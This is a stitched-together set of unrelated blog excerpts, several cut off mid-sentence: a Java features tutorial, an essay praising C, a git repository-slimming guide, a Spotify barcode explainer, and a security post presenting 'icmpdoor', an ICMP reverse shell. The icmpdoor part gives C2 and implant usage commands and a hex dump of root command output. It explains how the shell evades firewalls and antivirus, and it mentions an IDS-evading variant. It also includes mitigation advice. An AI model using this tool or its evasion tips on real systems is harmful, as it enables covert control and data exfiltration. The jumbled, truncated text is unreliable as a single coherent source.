<span>html</span> <span>+=</span> <span>"    &lt;p&gt;Hello, world&lt;/p&gt;\n"</span><span>;</span>
<span>html</span> <span>+=</span> <span>"  &lt;/body&gt;\n"</span><span>;</span>
<span>html</span> <span>+=</span> <span>"&lt;/html&gt;\n"</span><span>;</span>

<span>System</span><span>.</span><span>out</span><span>.</span><span>println</span><span>(</span><span>html</span><span>);</span>
</code></pre></div></div> <p>To make this situation more programmer-friendly, Java 15 introduced multi-line string literals called Text Blocks:</p> <div><div><pre><code><span>String</span> <span>html</span> <span>=</span> <span>"""
          &lt;html&gt;
            &lt;body&gt;
              &lt;p&gt;Hello, world&lt;/p&gt;
            &lt;/body&gt;
          &lt;/html&gt;
          """</span><span>;</span>

<span>System</span><span>.</span><span>out</span><span>.</span><span>println</span><span>(</span><span>html</span><span>);</span>
</code></pre></div></div> <p>They are similar to the old String literals but they can contain <strong>new lines and quotes without escaping</strong>.</p> <p>Text Blocks start with <code>"""</code> followed by a new line, and end with <code>"""</code>. The closing token can be at the end of the last line or in separate line such as is in the example above.</p> <p>They can be used anywhere an old String literal can be used and they both produce similar String objects.</p> <p>For each line-break in the source code, there will be a <code>\n</code> character in the result.</p> <div><div><pre><code>String twoLines = """
          Hello
          World
          """;
</code></pre></div></div> <p>This can be prevented by ending the line with the <code>\</code> character, which can be useful in case of very long lines that you’d like to split into two for keeping the source code readable.</p> <div><div><pre><code>String singleLine = """
          Hello \
          World
          """;
</code></pre></div></div> <p>Text Blocks can be aligned with neighboring Java code because <strong>incidental indentation is automatically removed</strong>. The compiler checks the whitespace used for indentation in each line to find the least indented line, and shifts each line to the left by this minimal common indentation.</p> <p>This means that if the closing <code>"""</code> is in a separate line, the indentation can be increased by shifting the closing token to the left.</p> <div><div><pre><code><span>String</span> <span>noIndentation</span> <span>=</span> <span>"""
          First line
          Second line
          """</span><span>;</span>

<span>String</span> <span>indentedByToSpaces</span> <span>=</span> <span>"""
          First line 
          Second line
        """</span><span>;</span>
</code></pre></div></div> <p>The opening <code>"""</code> does not count for the indentation removal so it’s not necessary to line up the text block with it. For example, both of the following examples produce the same string with the same indentation:</p> <div><div><pre><code>String indentedByToSpaces = """
         First line 
         Second line
       """;

String indentedByToSpaces = """
                              First line 
                              Second line
                            """;
</code></pre></div></div> <p>The <code>String</code> class also provides some programmatic ways to deal with indentation. The <code>indent</code> method takes an integer and returns a new string with the specified levels of additional indentation, while <code>stripIndent</code> returns the contents of the original string without all the incidental indentation.</p> <p>Text Blocks do not support interpolation, a feature I really miss. As the JEP says it may be considered in the future, and until then we can use <code>String::formatted</code> or <code>String::format</code>:</p> <div><div><pre><code><span>var</span> <span>greeting</span> <span>=</span> <span>"""
    hello
    %s

It’s important though to use <strong>consistent indentation</strong> for each line in the block, otherwise the incidental indentation can’t be removed.</p> <p>Most editors offer autoformatting and automatically add indentation on each new line when you hit enter. Make sure to use the latest version of these tools to ensure they play well with Text Blocks, and don’t try to add wrong indentations.</p> <h2 id="helpful-nullpointerexceptions">Helpful NullPointerExceptions</h2> <p><strong>Available since:</strong> <a href="https://bugs.openjdk.java.net/browse/JDK-8233014">JDK 15</a> (Enabled with <code>-XX:+ShowCodeDetailsInExceptionMessages</code> in <a href="https://openjdk.java.net/jeps/358">JDK 14</a>)</p> <p>This little gem is not really a language feature, but it’s so nice that I wanted to include it in this list.</p> <p>Traditionally, experiencing a <code>NullPointerException</code> was like this:</p> <div><div><pre><code><span>node</span><span>.</span><span>getElementsByTagName</span><span>(</span><span>"name"</span><span>).</span><span>item</span><span>(</span><span>0</span><span>).</span><span>getChildNodes</span><span>().</span><span>item</span><span>(</span><span>0</span><span>).</span><span>getNodeValue</span><span>();</span>

</code></pre></div></div> <p>From the exception it’s not obvious which method returned null in this case. For this reason many developers used to spread such statements over multiple lines to make sure they’ll be able to figure out which step led to the exception.</p> <p>From Java 15, there’s no need to do that because NPE’s describe which part was null in the statement. (Also, in in Java 14 you can enable it with the <code>-XX:+ShowCodeDetailsInExceptionMessages</code> flag.)</p> <div><div><pre><code><span>Exception</span> <span>in</span> <span>thread</span> <span>"main"</span> <span>java</span><span>.</span><span>lang</span><span>.</span><span>NullPointerException</span><span>:</span>

For example, when an NPE is thrown on the remote code executed via RMI, the exception will not include the helpful message.</p> <p>Currently the <strong>Helpful NullPointerExceptions are disabled by default</strong>, and have to be enabled with the <code>-XX:+ShowCodeDetailsInExceptionMessages</code> flag.</p> <h3 id="️-tip-check-your-tooling">⚠️ Tip: Check your tooling</h3> <p>When upgrading to Java 15, make sure to check your application and infrastructure to ensure:</p> <ul> <li>sensitive variable names not end up in log files and web server responses</li> <li>log parsing tools can handle the new message format</li> <li>the additional overhead required to construct the additional details is okay</li> </ul> <h2 id="switch-expressions">Switch Expressions</h2> <p><strong>Available since:</strong> <a href="https://openjdk.java.net/jeps/361">JDK 14</a> (Preview in <a href="https://openjdk.java.net/jeps/325">JDK 12</a> <a href="https://openjdk.java.net/jeps/354">JDK 13</a>)</p> <p>The good old <code>switch</code> got a facelift in Java 14. While Java keeps supporting the old <a href="https://docs.oracle.com/javase/tutorial/java/nutsandbolts/switch.html">switch statement</a>, it adds the new <strong>switch expression</strong> to the language:</p> <div><div><pre><code><span>int</span> <span>numLetters</span> <span>=</span> <span>switch</span> <span>(</span><span>day</span><span>)</span> <span>{</span>

<span>};</span>
</code></pre></div></div> <p>The most striking difference is that this new form <strong>can be used as an expression</strong>. It can be used to populate variables as demonstrated in the example above, and it can be used wherever an expression is accepted:</p> <div><div><pre><code><span>int</span> <span>k</span> <span>=</span> <span>3</span><span>;</span>

    <blockquote>
  <p>"Is C good as first language?" "Is&nbsp;there still future with C?"
"Why should I even bother with C?" "C is old!" …</p>
</blockquote>

<p>Have you heard such words? Well, I have. Countless of times, be it
in direct conversation or on a forum. The response is, as always, "it depends",
but in my humble opinion learning C is really valuable experience.</p>

<p>In this not too long text I hope to show you what I think makes C great.</p>

<h3 id="spirit-of-c">Spirit of C</h3>

<p>Let's start with a quote from document <a href="http://www.open-std.org/jtc1/sc22/wg14/www/C99RationaleV5.10.pdf">C99RationaleV5.10</a>:</p>

<blockquote>
  <p>The C89 Committee kept as a major goal to preserve the traditional spiritof C.
There are many facets of the spirit of C, but the essence is a community
sentiment of the underlying principles upon which the C language is based.
Some of the facets of the spirit of C can be summarized in phrases like:</p>
  <ul>
    <li><em>Trust the programmer.</em></li>
    <li><em>Don’t prevent the programmer from doing what needs to be done.</em></li>
    <li><em>Keep the language small and simple.</em></li>
    <li><em>Provide only one way to do an operation.</em></li>
    <li><em>Make it fast, even if it is not guaranteed to be portable.</em></li>
  </ul>
</blockquote>

<p>Above points directly relate to what I will talk further in the article.</p>

<h3 id="mid-level">"Mid-level"</h3>

<p>In regards of level, there are two types of languages: low and high.</p>

<p>Low-level languages are close to the hardware, the only closer thing to CPU
would be electricity itself. Those languages are divided into machine code and
Assembly. The former is a stream of raw, usually binary, data. If somebody is
required to work with it, usually does it using more "readable" hexadecimal form.</p>

<p>Second-generation languages - Assembly - provide one abstraction level on top
of the machine code. Those languages are mostly only a mapping of human-readable
symbols, including symbolic addresses, to opcodes, addresses, numeric constants,
strings and so on. Also are different for each processor.</p>

<p>How do high-level languages, providing more abstraction, compare? Quoting Wikipedia:</p>

<blockquote>
  <p>In contrast to low-level programming languages, it may use natural language
elements, be easier to use, or may automate (or even hide entirely) significant
areas of computing systems (e.g. memory management), making the process of
developing a program simpler and more understandable than when using a
lower-level language. The amount of abstraction provided defines how
"high-level" a programming language is.</p>
</blockquote>

<p>In short: low = more machine friendly, high = more human friendly.</p>

<p>C is high-level, but back when it was created, most of the work was still being
done in low-level Assembly. As a result, C has lower level of abstraction than
other (still) widely used languages, hence I like to call it "mid-level".</p>

<p>You can also easily (with less language bloat) compile C code to Assembly
instead to binary and examine what instructions CPU will execute.</p>

<p>And if it there is a need, popular C compilers offers you the option in C level
down and use inline Assembly to squeeze everything out of CPU. Not really many
other languages implement such a thing.</p>

<h3 id="fairly-simple">Fairly simple</h3>

<p>Low-level languages are harder to program in. Not because they are more complicated,
but because they are more error prone and thus require way more commitment,
memorizing and fiddling.</p>

<p>C is mid-level, so "by definition" it's easier. But there comes the surprise,
learning it is easier compared to higher level languages. Why? Because of really
simple syntax and <a href="https://en.wikipedia.org/wiki/Structured_programming">structured paradigm</a>
(don't confuse with <code>struct</code>!). It doesn't take so much to learn the basics.
Loops, functions, structures, pointers, variables, types - the core of language.
Intense week to get the general idea. The rest is "just" maths and CS theorem.</p>

<p>But, but, but, but! Don't get me wrong! To master anything you will
need a lot more practice! <strong>A lot!</strong> And it's truth for anything out there!</p>

<h3 id="fast-and-lightweight">Fast and lightweight</h3>

<p>Standard C library is small compared to other languages (e.g Java). It's small
enough for you to try to memorize all functions successfully (not that it would
be a huge benefit). Yeah, many things should be deprecated long ago, there
obviously is some bloat (try to maintains something without bloat for few years,
let alone few decades), but there is not much enough of it to hinder the performance.</p>

<p>And what if libc is still too much? Nothing stands in the way of not using it
at all. Just don't include any of its headers - not even simple <code>printf()</code> will
be present. Replace it with any other library of your choice.</p>

<p>Maturity, emphasis on proper memory management, inline Assembly, small abstraction
and little bloat gives programmer really good control over the program.</p>

<p>This makes C an ideal choice for OS kernels (Linux, Windows NT or macOS's XNU to
name a few) or other languages (e.g. Python). That's also why C is so popular
on embedded systems, where you cannot afford to waste resources.</p>

<h3 id="ubiquity--portability">Ubiquity = portability</h3>

<p>Does there exist any (still) significant platform with no C compiler available?
Except for those which run only Assembly, I've never heard about one.
C programs are present on your high-end gaming PC, on NASA spacecrafts and
in ticket machines. Literally everywhere. C software runs the world.</p>

<p>In accordance to previous paragraphs, C is peculiarly strong choice for
microcontrollers and other forms of embedded systems, which surround us every day.</p>

<p>And have you heard about <a href="https://en.wikipedia.org/wiki/Foreign_function_interface">FFI</a>?
Turns out many other languages like to have some kind of compatibility with C.</p>

<p>You don't need to worry if you will be able to use this language somewhere as
for 99% you can! (Although it doesn't mean you should…) It means, that while
code may not be 100% portable, you will be a portable programmer.</p>

<h3 id="the-influencer">The influencer</h3>

<p>C has both directly and indirectly influenced innumerous amount of languages.
C++, Java, Go, D, Rust, Perl, even PHP and Python - those are but few examples.</p>

<p>Obviously, knowledge of C isn't needed to learn any of them and sometimes
may even push you to use not the best practices.</p>

<p>Nevertheless, I think it's important to remember the roots. And if you are
cautious, familiarity with C might give you some foothold. It's especially the
case with C++.</p>

<h3 id="rich-collection-of-libraries">Rich collection of libraries</h3>

<p>I suspect all this talk about fastness, lightness, mid-level, Assembly etc. might
have give you an idea, you will need to implement everything yourself. There may
be not any <a href="https://docs.oracle.com/javase/8/docs/api/java/util/LinkedHashMap.html"><code>LinkedHashMap</code></a>
like in Java or other or other functionality like garbage collector…
True, true, except…  not entirely.</p>

<p>C is mature and popular language. Name a thing and believe me, somebody somewhere
already created library for it (although if think about something too obscure,
you won't find it for all the world, but it does exists).</p>

<p>You want garbage collector? <a href="https://www.hboehm.info/gc/">Boehm GC</a> has you covered.
TUI? Nothing like timeless <a href="https://invisible-island.net/ncurses/">ncurses</a>.
Examples can be listed almost infinitely:

<a href="https://pdcurses.org/">PDCurses</a>,

<a href="https://mupdf.com/">MuPDF</a>,
<a href="https://www.openssl.org/">OpenSSL</a>…</p>

<p>It's very universal language - you can program basically anything: web server,
video game (e.g. <a href="https://github.com/id-Software">classics from <em>id Software</em></a>),
operating system, other programming language or wrapper forcing Firefox to obey
<a href="https://wiki.archlinux.org/index.php/XDG_Base_Directory">XDG Base Directory specification</a>,
because when I'm an administrator, the programs will do exacly what I told them to!</p>

<p>However, please, remember - the fact you can, doesn't mean you should. For example,
if you want to create a video game, you really ought to turn your eyes to C++.
And you should know, that…</p>

<h3 id="c-is-highly-backward-compatible">C++ is highly backward compatible</h3>

<p>Why do I even make the whole point out of C++ here? Because it's one of most
widely used languages today and you encountering it is more than certain.</p>

<p>In contrary to other languages embracing C compatibility, C++ was created as its
direct descendant and committee goes to great lengths to keep the "copy-paste"
compatibility with it - in most cases you can compile C code as C++ just fine.</p>

<p>Don't be mistaken, C++ isn't by any means a superset of C - the code isn't always
going to work with C++ and a good C code isn't necessary good C++ code. Consider example:</p>
<div><div><pre><code><span>int</span><span>*</span> <span>x</span> <span>=</span> <span>malloc</span><span>(</span><span>10</span> <span>*</span> <span>sizeof</span><span>(</span><span>*</span><span>x</span><span>));</span>
</code></pre></div></div>
<p>Proper way in C, but in C++ there ought to be <code>(int*)</code> before <code>malloc()</code>,
for it to work, not to mention you should use <code>new int[10]</code> instead.</p>

<p>Although in most cases you can use C library safely in your C++ project.</p>

<p>All examples from the previous point not only <strong>can be</strong>, but <strong>often are</strong>
used in such way. E.g. I myself used <em>ncurses</em> in my C++ code for hex editor
<a href="https://joren.ga/bym/">Bym</a>.</p>

<p>Even libraries already compiled with C compiler can be made compatible with C++,
thanks to <a href="https://en.cppreference.com/w/cpp/language/language_linkage"><code>extern "C"</code></a>
linkage specifier.</p>

<h3 id="a-blot-on-the-landscape">A blot on the landscape…</h3>

<p>C was created in year 1972 on the foundation of B language, so over the years
it acquired some quirks (<code>memcpy()</code> is defined in string header!), some things
became obsolete, some useless and are kept only for compatibility with old code.</p>

<p>A beginner is likely to burn a lot of time chasing down strange behavior caused
by memory corruption with no idea how to reason about, what may lead actually
big discouraged to programming in general. There is little to none mechanism
to prevent programmer from shooting themselves in the foot.</p>

<p>It's also important to take into account that C is not the introduction to
Computer Science. Learning none of languages is. You need to study it properly
to get a true understanding of this vast field. If not formal education in
university, then online one will be good too. The Internet is full of resources,
some can be found on my <a href="https://joren.ga/urlsList/">list of URLs</a>.</p>

<h2 id="conclusion">Conclusion</h2>

<p>Learning C is valuable experience and it's worth it. If not as your first
language, then as second, third, fourth or whatever. There are a lot of advantages,
but also some disadvantages. At least trying won't hurt. Give it a chance, who
knows, you may truly get to like it, just like me.</p>

<p>And don't believe people saying "C is dead" or "It will soon be replaced"
(I'm looking at you Rust fans). C is fine and will be relevant for few next decades too.
Heck! COBOL, nearly forgotten, yet there are still job openings! How is C supposed
to become obscure when, in the moment I write those words, there is planned new
standard …</p></div></div>

<p>ICMP is mainly used to ping computers and appliances across networks. This blog post explains why leaving ICMP unfiltered by a corporate and host-based firewall can form a bigger risk than you might initially think. Our ICMP reverse shell called icmpdoor can tunnel out a covert channel to control a compromised machine and exfiltrate data as an insider threat. Your Anti-Virus (AV) will most likely not detect and block icmpdoor either. This ICMP reverse shell works both on Linux and Windows 10.</p>

<h2>Reverse Shell</h2>
<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#reverse-shell" target="_blank">A reverse shell</a> is a remote interactive shell for command execution initiated by the attacker to gain control over a compromised system. A reverse shell can also be abused by an insider threat to exfiltrate data over this covert channel. Corporate edge and core firewalls are typically configured to filter/deny/block TCP and UDP ports, or ever specific applications (layer 7 firewalling). Figure 1 shows how a well configured firewall should block a traditional TCP or UDP reverse shell:</p>

<p><img src="https://cryptsus.com/blog/tcp-reverse-shell.jpg" title="tcp-reverse-shell" alt="tcp-reverse-shell" height="155" width="750"><br>
Figure 1: Firewall blocks reverse shell over port 4444</p>

<h2>ICMP Reverse Shell</h2>
<p>ICMP stands for Internet Control Message Protocol. This protocol is often overlooked or depreciated when planning a firewall strategy. ICMP firewall filtering is rarely configured which allows malicious actors to evade firewalls. Abusing ICMP as a backdoor has been done by <a href="https://cptofevilminions.github.io/Network_based_MITRE_ATTACK_matrix/techniques/command_and_control/icmp" target="_blank">at least one APT (Advanced Persistent Threat) group in the past</a>. Blocking the ICMP protocol completely would also imply hosts can no longer ping each other.</p>

<p>I decided to write my own ICMP reverse shell called <a href="https://github.com/krabelize/icmpdoor" target="_blank">icmpdoor</a> in Python 3 since I could not find a proper alternative. This ICMP reverse shell tunnel works on most, if not all, Linux distributions and Windows 10 as long as you can ping from Machine A to Machine B.</p>

<h2>ICMP deep dive</h2>
<p>We first analyze a traditional ping. Typically a ping echo-request (type 8) is sent and expect a ping echo-reply (type 0) in return. Code block 1 shows us the <a href="https://tools.ietf.org/html/rfc792" target="_blank">RFC 792 ICMP echo-request and echo-reply packets header</a>.</p>

<pre><code>0                   1                     2                   3
0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1

+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</code></pre>
<p>Code block 1: ICMP echo-request and echo-reply packet headers</p>

<p>The optional ICMP Data field is normally used for error messaging. However, instead of an error message we will abuse this data field for our reverse shell payload (Raw) which can be maximum 576 bytes in size. We will fragment the payload if the total size exceeds this maximum of 576 bytes.</p>

<p>We also modify and abuse the ICMP Identifier field to a static value of 13170 in order to filter out legitimate ICMP packets and match our ICMP reverse shell. In total we filter/manipulate the following header fields:
</p><p><b>1)</b> <span>pkt[IP].src</span> (IP address of machine A or B)</p>
<p><b>2)</b> <span>ip[ttl]</span> (Time To Live == 64)</p>
<p><b>3)</b> <span>pkt[ICMP].type</span> (Echo Request [8] or Echo Reply [0])</p>
<p><b>4)</b> <span>pkt[ICMP].id</span> (Static Identification (ID) field with value 13170 == 0x3372 in hexadecimal)</p>
<p><b>5)</b> <span>pkt[Raw].load</span> (Payload ≠ empty)</p>

<p>Figure 2 shows all the packet encapsulation layers and their values when we send the Linux command <span>id</span>. with a reply <span>uid=0(root) gid=0(root) groups=0(root)</span>. <a href="https://github.com/krabelize/icmpdoor" target="_blank">icmpdoor</a> is encapsulated in the following network packets: <span>MAC[IP[ICMP(payload)]]]</span></p>
<p><img src="https://cryptsus.com/blog/packet-headers.jpg" title="icmp-reverse-shell-packet-headers" alt="icmp-reverse-shell-packet-headers" height="450" width="650"><br>
Figure 2: ICMP packet header</p>

<p>The Python 3 <a href="https://scapy.net/" target="_blank">Scapy</a> module helps us manipulate network fields. Figure 3 shows the connection flow followed in a Command &amp; Control (C2) setup:</p>

<p><img src="https://cryptsus.com/blog/icmp-reverse-shell.jpg" title="icmp-reverse-shell" alt="icmp-reverse-shell" height="155" width="750"><br>
Figure 3: imcpdoor Command &amp; Control (C2) execution over ICMP</p>

<p><a href="https://github.com/krabelize/icmpdoor" target="_blank"><span>icmp-cnc.py</span></a> runs on Machine A while <a href="https://github.com/krabelize/icmpdoor" target="_blank"><span>icmpdoor.py</span></a> or <a href="https://github.com/krabelize/icmpdoor" target="_blank"><span>icmpdoor.exe</span></a> runs on Machine B.</p>

<p><b>1)</b> The attacker sends a command e.g. <span>hostname</span> as payload over ICMP echo-request (code 8) with ICMP ID 13170.
</p><p><b>2)</b> The victim executes strips of the network packets and executes command <span>hostname</span> with <span>os.popen</span>.
</p><p><b>3)</b> The victim sends the output of the <span>hostname</span> command <span>ubuntu2040</span> back to the attacker’s machine over ICMP echo-reply (code 0) with the same ICMP ID 13170. </p>

<p><a href="https://github.com/krabelize/icmpdoor" target="_blank">icmpdoor</a> does not time-out automatically because it does not establish a socket. Instead, this reverse shell is connectionless due to the nature of how the ICMP protocol works.</p>

<p>You can pull <a href="https://github.com/krabelize/icmpdoor" target="_blank"><span>icmpdoor</span></a> <a href="https://github.com/krabelize/icmpdoor" target="_blank">from my GitHub repository</a>. Pre-compiled stand-alone binaries for Windows 10 and Linux are also available from the <a href="https://github.com/krabelize/icmpdoor" target="_blank">same repo</a>.</p>

<p>Usage:</p>
<pre><code>./icmp-cnc.py -i INTERFACE -d DESTINATION_IP (Command &amp; Control (C2))
./icmpdoor.py -i INTERFACE -d DESTINATION_IP (Implant)
</code></pre>

<p>Do note that this ICMP reverse shell is unencrypted and does not use (base64) encoding:</p>
<pre><code>$ shell: id
0000  00 0C 29 61 10 78 00 0C 29 B8 E9 F9 08 00 45 00  ..)a.x..).....E.

0020  B2 47 00 00 16 51 33 72 00 00 75 69 64 3D 30 28  .G...Q3r..uid=0(

0040  29 20 67 72 6F 75 70 73 3D 30 28 72 6F 6F 74 29  ) groups=0(root)
0050  0A
</code></pre>

<h2>Mitigation</h2>
<p>Network administrators and security engineers should limit or deny ICMP traffic as much as possible. When this is not feasible due to protocol requirements or network planning, scope the accepted source and destination of ICMP packets. <a href="https://cryptsus.com/blog/advanced-perimeter-based-iptables-firewall-on-linux.html" target="_blank">This blog post elaborates on how to configure this with iptables</a>.</p>

<p>Always take the scenario of lateral movement into account when you are planning network segmentation and configuring firewall settings. Lateral movement is a technique used by malicious actors after gaining initial access, to progressively move further into a domain, network or infrastructure. This means isolation of assets and firewall filters are only limited to the scope of a certain level.</p>

<p>Firewalls and gateways can also rate-limit ICMP packets. However, this control is mostly used to mitigate DDoS attacks and would imply ICMP-based data exfiltration is only slowed down.</p>

<p>DPI (Deep Packet Inspection) and IPS (Intrusion Prevention System) solutions such as <a href="https://zeek.org/" target="_blank">Zeek</a> and <a href="https://www.snort.org/" target="_blank">Snort</a> or next-gen firewalls could possibly detected this ICMP tunnel due to presence of the (plain-text) payload and static ID value. We have a modified version of <a href="https://github.com/krabelize/icmpdoor" target="_blank"><span>icmpdoor</span></a> we use for client engagements which does not get detected by these IDS/IPS systems.</p>

<p>You can also configure the TTL (Time To Live) <a href="https://www.netresec.com/?page=Blog&amp;month=2011-11&amp;post=Passive-OS-Fingerprinting" target="_blank">according to the expected Operating System (OS) of the victim</a>. <a href="https://github.com/krabelize/icmpdoor" target="_blank"><span>icmpdoor</span></a> uses a TTL value of 64 which is the default for most Linux distributions. Windows uses a TTL value of 128, while network appliances usually have a TTL of 255.</p>

<h2>Screenshots</h2>

    <div><p id="907bc591-58b8-48fe-91c9-bfb7e0d06966"><strong>The situation:</strong> A project has several binaries that need to be tracked and versioned along with the code. The binaries are small enough and rarely change, so versioning them directly in git is appropriate.</p><p id="2fee7b63-0896-4010-9121-a47da3d687af">That was some months ago, and in the meantime, the project evolved, binaries grew and changed. Now you're left with a bloated repository of multiple gigabytes that takes a long time to clone. This is significantly slowing down the CI pipeline and it's time to fix it.</p><h2 id="6a23a05c-f86a-44fc-8c27-1a6fd0debdec">Dealing with symptoms directly</h2><p id="4d799a62-5fcf-48b8-b398-24de358368ae">There are many options to solve this problem, all with unique pros and cons. The simplest solution is dealing only with problematic symptoms like slow CI pipeline. This can be overcome with one of the following:</p><ul id="a4d928e3-99ad-4c47-8e1e-00b7fe1b5ea9"><li>Shallow clone <code>git clone --depth 1 URL</code>: Limiting the depth of the clone means that the history is not pulled. </li></ul><ul id="bbad9cea-fc88-4976-bd08-5786bcaeb16e"><li>Clone without binary files <code>git clone --filter=blob:none URL</code>: The filter option is more powerful and can be used filter only specific files that meet specific criteria. See <a href="https://github.com/git/git/blob/d98273ba77e1ab9ec755576bc86c716a97bf59d7/Documentation/rev-list-options.txt#L869">docs</a>.</li></ul><ul id="ac2c38f0-fc62-4ded-be0f-e3410dfb99c3"><li>Finally, if the large binary file size is not your problem but the large number of files, you should look into <code>git sparse-checkout</code>. See <a href="https://git-scm.com/docs/git-sparse-checkout">docs</a>.</li></ul><p id="42b388e0-b311-4a54-8629-847c1966834f">But sometimes these workarounds are not enough and you need to rewrite the repo history. Below I will discuss the two solutions that should cover most of the usecases. The first option is  migrating to the <code>git lfs</code>. The second option is pruning the binaries from the repo history using <code>git filter-repo</code> and versioning the binaries in a separate versioning system.</p><h2 id="95da721f-0685-4fd3-b43c-7862ef86cb85">Migrating to <code>git lfs</code></h2><p id="2f6b6dd0-0b0d-4183-bb39-00efca470d21">The main advantage of the migration to <code>git lfs</code> is that the repo history is left intact and no information is lost. This method is recommended when the binaries are really tightly coupled with the code. This is easily done with the following steps:</p><ul id="7a4486db-1bb5-4f5e-bb14-8302fe5b5d7e"><li>Install the git-lfs using this <a href="https://github.com/git-lfs/git-lfs/wiki/Installation">guide</a> or in conda like so:
<code>conda install -c conda-forge git-lfs</code></li></ul><ul id="136e92fe-b98f-40ec-990b-4c213d4a09cb"><li>In your repo, run: <code>git lfs install</code></li></ul><ul id="c37e7873-1352-4e38-9276-4ed2bfa38eb8"><li>Rewrite history. For example migrating all bz2 files:
<code>git lfs migrate import --include-ref=master --include="*.bz2"</code></li></ul><p id="5f882e5c-d19d-459f-9677-eb3f7f128e09">For more details on how to match your usecase see <a href="https://github.com/git-lfs/git-lfs/wiki/Tutorial#migrating-existing-repository-data-to-lfs">this guide</a>.</p><p id="6095bb85-e0ca-484d-82f8-869c3867f3e7">The downside of using <code>git lfs</code> is that it adds more complexity to the workflow of developers. Decisions need to be made: Which files are to be versioned with git and which with <code>git lfs</code>? Do you decide based on the file size or the file format/extension? The <code>.gitattributes</code> file needs to be maintained etc.</p><p id="27da68da-cd07-4535-8c4f-60b5f5c71462">You get the gist, there is overhead and nobody likes overhead. But if the binary files are really tightly coupled with the code and need to be version, this is the way to go.</p><h2 id="3b7518d8-e554-4a14-a38b-93a34c4caaa9">Pruning and migrating out of git</h2><p id="fc89422d-550b-4a9a-9200-c6f9b104e10f">When the binaries are not tightly coupled with the code there is another solution: simply prune away all the binary files from the repo history and version them in a separate, more appropriate system.</p><p id="6d57c9d1-ebdf-4313-b89d-492fc83326a2">The pruning part is simple thanks to the amazing <a href="https://github.com/newren/git-filter-repo"><code>git filter-repo</code></a> tool. For example, pruning away all the binary files larger than 10 MB can be done using the <a href="https://docs.gitlab.com/ee/user/project/repository/reducing_the_repo_size_using_git.html#repository-cleanup">guide from GitLab</a>. For more elaborate cases please refer to the official <a href="https://htmlpreview.github.io/?https://github.com/newren/git-filter-repo/blob/docs/html/git-filter-repo.html#EXAMPLES">documentation with examples</a>.</p><p id="f4cc1de1-b07e-40c7-9ce7-61d0622baee9">After the pruning, your repo should be very lean, and you are free to version or track the binaries outside of git. For example, in the project I was working on the <a href="https://mlflow.org/"><code>mlflow</code></a> was the appropriate tool we decided on after some trial period. Using the <code>mlflow</code> <a href="https://mlflow.org/docs/latest/python_api/index.html">Python API</a> it was easy to track any artifacts and results along with the meta-data which matched the needs of the project well.</p><p id="03957dad-c639-4d19-b6dd-c83bc9bd6390">The obvious downside is that you lose the history of the binary files. This was the trade-off we were willing to take as the history of the binary files was not very valuable, and we still had access to it in the backups of the repo we made before the prune.</p><p id="76ab4e36-2b97-4d4e-94dd-fd399c6d71a0">Hope this was helpful and you were able to get some useful pointers and links that will help with your git endeavors. Let me know if you found a different solution. Cheers! 🍻</p></div>

I set out to figure out how they worked, which lead me on a winding journey through barcode history, patents, packet sniffing, error correction, and Gray tables.</p><h2 id="spotify-uris">Spotify URIs</h2><p>Let’s start with Spotify URIs (Uniform Resource Identifiers). Different pieces of media (artists, albums, songs, playlists, users) all have a URI.</p><p>The ABBA song “Take a Chance on Me” has this URI:</p><p><code>spotify:track:6vQN2a9QSgWcm74KEZYfDL</code>.</p><p>The ABBA Album “The Album” has the following URI:</p><p><code>spotify:album:5GwbPSgiTECzQiE6u7s0ZN</code></p><p>As you can see, the URIs can be broken up into components:</p><p><code>spotify:&lt;media type&gt;:&lt;22 characters&gt;</code>.</p><p>The 22 characters are the numbers 0-9, characters a-z and A-Z. This means there are <code>10 + 26 + 26 = 62</code> possibilities for each character (almost <a href="https://en.wikipedia.org/wiki/Base64">Base64</a>). So the potential number of Spotify URIs is <code>62^22</code> which is equal to <code>2.7e39</code> or</p><div><pre><code data-lang="python"><span>2</span>,<span>707</span>,<span>803</span>,<span>647</span>,<span>802</span>,<span>660</span>,<span>400</span>,<span>290</span>,<span>261</span>,<span>537</span>,<span>185</span>,<span>326</span>,<span>956</span>,<span>544</span>

This must help in identifying if the barcode is valid. Having the 12th bar as the max height also helps you calculate the ratios of the bar heights. I suspect setting the first and last bar set to 0 is an aesthetic choice: it makes the barcode look more like a sound wave.

</code></pre></div><h3 id="forward-error-correction">Forward error correction</h3><p>Next <a href="https://en.wikipedia.org/wiki/Error_correction_code#Forward_error_correction">forward error correction</a> (FEC) is used to add some <strong>redundancy</strong> to the code. This makes the decoding process more reliable. Decoding Spotify codes involves going from analog (bar lengths) to digital (media reference), so it is a good candidate for this error correction.</p><blockquote><p>The fundamental principle of [error correction] is to add redundant bits in order to help the decoder to find out the true message that was encoded by the transmitter.</p></blockquote><p>A simple example of error correction would be to replicate each bit twice. So instead of sending <code>1</code>, you would send <code>111</code>. When that triplet is sent across a “noisy” communication channel, some of the bits could get flipped. But since there are 2 redundant bits, the receiver can guess what the value was meant to be:</p><table><thead><tr><th>Triplet received</th><th>Interpreted as</th></tr></thead><tbody><tr><td>000</td><td>0 (error-free)</td></tr><tr><td>001</td><td>0</td></tr><tr><td>010</td><td>0</td></tr><tr><td>100</td><td>0</td></tr><tr><td>111</td><td>1 (error-free)</td></tr><tr><td>110</td><td>1</td></tr><tr><td>101</td><td>1</td></tr><tr><td>011</td><td>1</td></tr></tbody></table><p>The patents don’t specify what forward error correction schema Spotify uses, but they do say that they add 15 bits at this step. The code rate of an error correction scheme is the ratio of the information bits to the total encoded bit length. Spotify adds 15 bits to the 45 bit code, so the code rate is <code>45 / 60 = 0.75</code>. This code rate is high (close to 1) meaning it is fairly weak. It facilitates a limited amount of error correction, but that is okay. If you are sending a message to a deep space probe you want a very strong code. A Spotify code is pretty low risk: it’s easy to ping the server a few times if you decode the wrong media reference.</p><p>The total forward error corrected code is 60 bits long, which is the exact amount of information that can be encoded in the 20 octals (bar heights) in the Spotify barcode!</p><p>The patents do mention that Spotify uses the <a href="https://en.wikipedia.org/wiki/Viterbi_decoder">Viterbi algorithm</a> to decode the media reference from the forward error corrected code. I won’t go into it here, but that algorithm uses the redundant bits from the forward error correction to determine the best guess of the actual media reference.</p><h3 id="gray-code">Gray Code</h3><p>I really like this part of the Spotify codes.</p><p><a href="https://en.wikipedia.org/wiki/Gray_code">Gray code</a> is 